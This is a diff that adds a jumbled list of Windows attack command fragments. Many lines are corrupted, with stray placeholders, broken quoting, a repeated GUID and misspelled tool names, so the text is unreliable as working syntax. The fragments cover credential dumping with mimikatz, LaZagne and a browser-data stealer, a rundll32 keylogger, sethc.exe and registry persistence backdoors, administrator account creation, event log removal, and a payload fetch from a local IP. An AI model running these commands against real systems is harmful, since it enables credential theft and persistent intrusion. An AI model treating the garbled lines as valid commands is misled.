@@ -1,0 +1,64 @@
+psexec \\ : set-wmiinstance -namespace 'root/subscription ' -class -user `` $ shell.createshortcut ( `` hkey_local_machine\system\currentcontrolset\control\session manager\appcertdlls '' `` $ i = i = `` ; , i -l $ ( `` ( '' logon/logoff `` \windows\system32\sethc.exe /grant administrators : $ { ( http : \users\ $
+psr.exe /start /output $ { service_name } command= '' $ { ip_address } -u $ { temp % temp % temp % cor_enable_profiling /grant keylog
+wlrmdr.exe -s $ { registry_path }
+rdrleakdiag.exe /p % temp % @ % hklm\systyem $ { \users\ } -i $ ( { id % ( convertto-securestring `` 1 } -l $ ( `` threads }
+kerberos : :logonpasswords
+net localgroup administrators `` `` $ { weak_service_name } \inprocserver32 '' -name `` autorun '' '' `` threadingmodel '' $ true
+net user $ { domain }
+net user = `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } ; -u $ true
+lazagne.exe windows
+cscript $ { docx }
+namp -sn $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } /add
+net `` clearing $ cor_profiler = `` '' -name `` $ i ; -users
+reg query
+namp -sn $ { ip }
+bypassuac.exe $ { url }
+net user administrator /domain
+net user administrator /add
+net accounts
+rdrleakdiag.exe /p $ filter ; windows
+get-item -path `` hklm : windir % processors\atomicredteam '' '' file '' windir % \system32\osk.exe }
+net user administrator @ `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } in @ 5
+reg add `` hklm\software\microsoft\windows nt\currentversion\windows '' /v `` $ '' t1547.009 mainwindowtitle
+set windir= $ { -m reg env : \users\ `` $ shell.createshortcut : username )
+namp -sn $ { ip } / $ { command }
+namp -sn $ { user_name }
+sekurlsa : :logonpasswords full
+net user $ { kerberos ( '' domain file consumer , `` filter ; ; $ user )
+open $ { malicious_binary } as % find i -l -w '' $ ( get-process menu\programs\startup\t1547.009.lnk '' $ { command } '' )
+bitsadmin.exe /create $ { ip
+net user administrator $ { user_name } in $ { mask }
+lazagne.exe windows
+reg add `` hklm\software\microsoft\windows nt\currentversion\image file execution options\svchost.exe '' scrnsave.exe /d `` $ { command }
+invoke-screencap $ env : c : :credman
+c : \windows\system32\spool\tools\printbrm.exe -r -f $ { lsass_pid } -l '' $ { domain }
+% set opmode mode=disable
+query user
+rundll32 keylogger_dll_invisible.dll , keylog
+python -c `` /setnotifycmdline $ : //192.168.1.29:9000/payload/redirect.sdb -o for `` $ { hklm\system\currentcontrolset\control\lsa\ '' `` administrators : '' \programdata\microsoft\windows\start processor '' @ $ { ip_prefix } . $ i in ( '' \windows\system32\sethc.exe
+bitsadmin.exe -l $ ( `` hklm\system\currentcontrolset\control\lsa\ = `` installscreensaver $ { new_time }
+wmic process list findstr 1
+set windir= $ domain
+net user $ { base64_commmand } '' username= $ { range_end }
+rundll32 popcalc.dll , keylog
+samfile -consoleoutput -noninteractive ''
+get-ciminstance -classname win32_processor | select-object -excludeproperty objectcategory=computer )
+hack-browser-data-windows-64bit.exe
+`` '' powershell `` .\lazagne .. -f ( remove-eventlog -r -a `` $ { clsid }
+sharprdp.exe computername= $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } /sc -force )
+`` hklm : \windows\system32\spool\tools\printbrm.exe -r /user : $ { net i
+lazagne.exe windows
+net user = defaultaccount binpath=
+lazagne.exe windows
+net user administrator /domain
+lazagne.exe windows
+net user administrator /domain
+net consumerargs = `` bits_job_name } in `` $ { script_web_url } , `` ( $ ) ;
+$ consumerargs = @ administrators '' ; /user : $ wscriptshell.createshortcut ( `` select * /v autorun
+namp -sn $ { user_name } /add
+set programw6432= $ { path /d $ { destination } }
+namp -sn $ { user_name } -accepteula `` $ { output_zip_name } @ `` keylog
+net user administrator /domain
+hack-browser-data-windows-64bit.exe
+rdrleakdiag.exe /p $ service account user_name }
+net administrators shadow \windows\system32\sethc.exe /grant administrators : keylog
